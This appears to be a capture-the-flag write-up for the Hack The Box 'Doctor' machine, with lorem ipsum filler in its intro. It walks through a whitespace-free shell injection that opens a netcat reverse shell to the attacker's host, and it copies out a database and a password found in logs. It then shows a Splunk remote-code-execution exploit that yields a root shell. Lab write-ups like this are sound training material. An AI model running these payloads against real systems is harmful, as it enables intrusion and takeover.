---
layout: single
title: Doctor - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-11-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-doctor/doctor_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-doctor/doctor_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. root@nidus:/git/htb/doctor# nmap -Pn -n -sC -sV 10.10.10.209
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 12:51 CEST
    Nmap scan report for 10.10.10.209
    Host is up (0.035s latency).
    Not shown: 997 filtered ports
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Doctor
    8089/tcp open  ssl/http Splunkd httpd
    | http-robots.txt: 1 disallowed entry
    |_/
    |_http-server-header: Splunkd
    |_http-title: splunkd
    | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
    | Not valid before: 2020-09-06T15:57:27
    |_Not valid after:  2023-09-06T15:57:27
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


    DIRB:
    + http://10.10.10.209/index.html (CODE:200|SIZE:19848)

    NIKTO:
    -


2. Visiting the http://10.10.10.209 we find a domain name, doctors.htb - add it to /etc/hosts. Three potential users, Jade Guzman,
   Hannah Ford, James Wilson, and blog posts by Admin. We find nothing more of interest so lets move ahead to http://doctors.htb.

   We are greeted with a login promtp. Trying different email addresses it seems like the error message is the same no matter what.
   Sign up to the site and create an account. Once logged in we are able to create a post, and update our profile.

   Our first post is at http://doctors.htb/post/2, notice that the first post got number 2 in the url. Visit http://doctors.htb/post/1
   and we find a post by user Admin.

      admin 2020-09-18
      Doctor blog

      A free blog to share medical knowledge. Be kind!

   We can view all post by user Admin on http://doctors.htb/user/admin, however he's only done one.


3. From the post content field we have code execution through a URL validation function. All URL's posted in the content field
   will be executed to see if valid, giving us some kind of Code Execution.

   Content: http://10.10.14.9:4488

   root@nidus:/git/htb/doctor# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 42406
    GET / HTTP/1.1
    Host: 10.10.14.9:4488
    User-Agent: curl/7.68.0
    Accept: */*

   Trying to setup reverse payload through php etc doesn't do anything, so I think we need to do the RCE in the URL.
   After a while I found the post from 'Shift or Die' about Shell Injection without withspaces and played around with that.
   Reading the forums + tweaking that one line eventually gave me a reverse shell.

   Content: http://10.10.14.9/$(nc.traditional$IFS'10.10.14.9'$IFS'4488'$IFS-e/bin/sh)

   root@nidus:/git/htb/doctor# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 42612
    whoami
      web


3. Upgrade the shell ( python3 -c 'import pty;pty.spawn("/bin/bash")'; )
   Once we have a foothold, the first dir we land in has a script called blog.sh, we see the script pointing towards a database file
   and we get a secret key(?).

   web@doctor:~$ cat blog.sh
    #!/bin/bash
    SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py

   Transfer the database file to your local computer and investigate it.
    root@nidus:/git/htb/doctor# nc -lp 1234 > site.db
    web@doctor:~/blog/flaskblog$ nc -w 3 10.10.14.9 1234 < site.db

    root@nidus:/git/htb/doctor# sqlite3 site.db
      SQLite version 3.33.0 2020-08-14 13:23:32
      Enter ".help" for usage hints.
      sqlite> .tables
        post  user
      sqlite> .schema user
        CREATE TABLE user (
        	id INTEGER NOT NULL,
        	username VARCHAR(20) NOT NULL,
        	email VARCHAR(120) NOT NULL,
        	image_file VARCHAR(20) NOT NULL,
        	password VARCHAR(60) NOT NULL,
        	PRIMARY KEY (id),
        	UNIQUE (username),
        	UNIQUE (email)
        );
      sqlite> .header ON
      sqlite> select * from user;
        id|username|email|image_file|password
        1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
        2|p3|p3@p3.se|default.gif|$2b$12$foJvOG4jKtMmHjJ6n6YU7unB2zQQnIDlYqHkvvttNKsafJyFn/9DK

    The hashes for me are unknown, and using Kali's 'hash-identifier' gives nothing. Crackstation are unable to crack the hashes, so
    this might be a rabbit hole.


4. Enumerate the logs! As the box image suggests the logs should be a part of this box. Looking through /var/log/apache2 we find
   backup sticking out like a sore thumb. Grep it for password and we got a hit!

    web@doctor:/var/log/apache2$ cat backup | grep password
      10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"


5. Change to user Shaun and grab user.txt

    web@doctor:/var/log/apache2$ su shaun
    Password: Guitar123

    shaun@doctor:/var/log/apache2$
    shaun@doctor:/var/log/apache2$ cat ~/user.txt
      9ebedf116da41ba52906a5ab9ca5d8f8


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Looking at the running processes we see that splunkd is running as root on port 8089.

root        1129  0.2  2.2 280284 91684 ?        Sl   Sep27   2:58 splunkd -p 8089 start

Googling around for Splunk exploits I came across a script called PySplunkWhisperer2_remote.py, that can be used for RCE. As Splunk
is running as root, in our case, we can probably use this RCE to gain a root shell.


2. The script syntaxes and how to use them, especially payload, was difficult for me to graps. After some further googling I found
a page from eapolsniper, explaning a lot of different ways on how to use this exploit. With this new found knowledge;

Setup a local nc listener.

Exploit:
root@nidus:/git/htb/doctor# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/sh 10.10.14.9 4488" --lhost 10.10.14.9
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpre8z_d99.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.9:8181/
10.10.10.209 - - [05/Nov/2020 12:13:19] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

root@nidus:/git/htb/doctor# nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 56250
whoami
root
cat /root/root.txt
45f20a790d86b9e8334d447f9e878605


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Shell Injection - nc.traditional
  https://shiftordie.de/blog/2011/12/23/shell-injection-without-whitespace/

SQLite3 CLI:
  https://sqlite.org/cli.html

Splunk Exploit:
  https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py
  https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
